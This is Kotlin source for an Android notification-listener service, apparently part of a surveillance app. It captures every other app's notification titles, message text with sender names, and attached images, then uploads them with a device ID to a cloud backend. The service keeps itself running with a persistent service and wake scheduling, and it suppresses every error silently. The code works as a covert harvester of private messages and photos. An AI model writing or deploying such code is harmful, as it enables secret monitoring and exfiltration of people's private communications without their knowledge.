package com.example.sentry.service

import android.app.Notification
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Icon
import android.os.Build
import android.os.Bundle
import android.os.Parcelable
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.ConcurrentHashMap

class SentryNotificationService : NotificationListenerService() {
    private val scope = CoroutineScope(Dispatchers.IO)
    private val lastSeenNotifications = ConcurrentHashMap<String, Long>()

    override fun onListenerConnected() {
        super.onListenerConnected()
        try {
            SentryPersistentService.startService(applicationContext)
            SentryWakeManager.scheduleWakePulse(applicationContext)
            val active = activeNotifications ?: return
            for (sbn in active) {
                processNotification(sbn)
            }
        } catch (_: Exception) {
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        try {
            SentryPersistentService.startService(applicationContext)
        } catch (_: Exception) {}
        if (sbn == null) return
        processNotification(sbn)
    }

    private fun processNotification(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: "android"
        
        // Skip only own package notifications
        if (pkg == applicationContext.packageName || pkg.contains("com.example.sentry", ignoreCase = true)) {
            return
        }

        val notif = sbn.notification ?: return
        val extras = notif.extras ?: return

        // 1. Extract Title (Support Conversation Title, Big Title, Standard Title)
        var title = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_TITLE_BIG)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            ?: notif.tickerText?.toString()
            ?: ""

        // 2. Extract Body / Message Text (Support MessagingStyle, TextLines, BigText, Summary, Standard Text)
        var text = ""

        // Check MessagingStyle messages (WhatsApp, Telegram, Google Messages)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                if (!messages.isNullOrEmpty()) {
                    val latestMessages = mutableListOf<String>()
                    for (msg in messages) {
                        if (msg is Bundle) {
                            val msgText = msg.getCharSequence("text")?.toString()
                            val sender = msg.getCharSequence("sender")?.toString()
                            if (!msgText.isNullOrBlank()) {
                                if (!sender.isNullOrBlank()) {
                                    latestMessages.add("$sender: $msgText")
                                } else {
                                    latestMessages.add(msgText)
                                }
                            }
                        }
                    }
                    if (latestMessages.isNotEmpty()) {
                        text = latestMessages.joinToString("\n")
                    }
                }
            } catch (_: Exception) {}
        }

        // Check InboxStyle text lines (Gmail, Outlook, Multi-message bundles)
        if (text.isBlank()) {
            try {
                val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                if (!textLines.isNullOrEmpty()) {
                    text = textLines.filterNotNull().joinToString("\n") { it.toString() }
                }
            } catch (_: Exception) {}
        }

        // Fallback to standard body fields
        if (text.isBlank()) {
            text = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString()
                ?: notif.tickerText?.toString()
                ?: ""
        }

        // If title was missing but subtext exists, use subtext as title
        if (title.isBlank()) {
            title = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString()
                ?: pkg.substringAfterLast('.').replaceFirstChar { if (it.isLowerCase()) it.titlecase() else it.toString() }
        }

        if (title.isBlank() && text.isBlank()) {
            return
        }

        // 3. Extract Attached Image / Picture (WhatsApp media, MMS, BigPicture)
        val imageBase64 = extractAttachedImageBase64(extras)

        // 4. Low-latency Deduplication (only 3-second window for exact identical notification)
        val notifKey = "${sbn.id}|$pkg|$title|$text"
        val now = System.currentTimeMillis()
        val lastSeen = lastSeenNotifications[notifKey] ?: 0L
        if (now - lastSeen < 3_000) {
            return
        }
        lastSeenNotifications[notifKey] = now

        // 5. Resolve Canonical App Name
        val appName = try {
            val ai = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(ai).toString().trim()
        } catch (_: Exception) {
            pkg.substringAfterLast('.').replaceFirstChar { if (it.isLowerCase()) it.titlecase() else it.toString() }
        }

        // 6. Submit to Sentry Cloud Backend (Infinite Persistent Cloud Storage)
        scope.launch {
            try {
                val client = SentryApiClient(applicationContext)
                val deviceId = CryptoManager.getOrCreateDeviceId(applicationContext)
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("packageName", pkg)
                    put("appName", appName)
                    put("title", title.ifBlank { "Notification" })
                    put("body", text.ifBlank { title })
                    if (!imageBase64.isNullOrBlank()) {
                        put("image", imageBase64)
                    }
                    put("timestamp", now)
                }
                client.submitNotification(body)
            } catch (_: Exception) {
            }
        }
    }

    private fun extractAttachedImageBase64(extras: Bundle): String? {
        try {
            var bitmap: Bitmap? = null

            // 1. Check android.picture / BigPictureStyle
            val picture = extras.get(Notification.EXTRA_PICTURE)
            if (picture is Bitmap) {
                bitmap = picture
            } else if (picture is Icon) {
                val drawable = picture.loadDrawable(applicationContext)
                if (drawable is BitmapDrawable) {
                    bitmap = drawable.bitmap
                }
            }

            // 2. Check android.pictureIcon (Android 12+)
            if (bitmap == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    val picIcon = extras.getParcelable("android.pictureIcon", Icon::class.java)
                    val drawable = picIcon?.loadDrawable(applicationContext)
                    if (drawable is BitmapDrawable) {
                        bitmap = drawable.bitmap
                    }
                } catch (_: Exception) {
                }
            }

            // 3. Check android.largeIcon
            if (bitmap == null) {
                val largeIcon = extras.get(Notification.EXTRA_LARGE_ICON)
                if (largeIcon is Bitmap) {
                    bitmap = largeIcon
                } else if (largeIcon is Icon) {
                    val drawable = largeIcon.loadDrawable(applicationContext)
                    if (drawable is BitmapDrawable) {
                        bitmap = drawable.bitmap
                    }
                }
            }

            if (bitmap != null) {
                val maxDim = 800
                val scaled = if (bitmap.width > maxDim || bitmap.height > maxDim) {
                    val ratio = bitmap.width.toFloat() / bitmap.height.toFloat()
                    val newW = if (ratio > 1) maxDim else (maxDim * ratio).toInt()
                    val newH = if (ratio > 1) (maxDim / ratio).toInt() else maxDim
                    Bitmap.createScaledBitmap(bitmap, newW.coerceAtLeast(1), newH.coerceAtLeast(1), true)
                } else {
                    bitmap
                }

                val stream = ByteArrayOutputStream()
                scaled.compress(Bitmap.CompressFormat.JPEG, 75, stream)
                val bytes = stream.toByteArray()
                return Base64.encodeToString(bytes, Base64.NO_WRAP)
            }
        } catch (_: Exception) {
        }
        return null
    }
}
